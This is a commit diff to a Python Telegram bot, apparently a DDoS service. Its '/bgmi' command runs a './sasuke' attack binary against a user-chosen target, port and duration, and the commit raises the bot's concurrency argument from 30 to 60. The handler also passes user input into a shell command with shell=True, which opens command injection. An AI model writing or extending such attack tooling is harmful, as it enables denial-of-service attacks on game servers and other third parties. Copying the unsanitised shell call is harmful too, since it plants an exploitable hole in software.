52c78631c0cdc48d3995f25a8763361dad4f1cc3
Mynkkp <ashakapoor0912@gmail.com>
2024-10-08 17:49:03 +0530

    Add files via upload

--- sasuke.py
+++ sasuke.py
@@ -253,7 +253,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./sasuke {target} {port} {time} 30"
+                full_command = f"./sasuke {target} {port} {time} 60"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack1 Finished. Target: {target} Port: {port} Time: {time}"
         else:
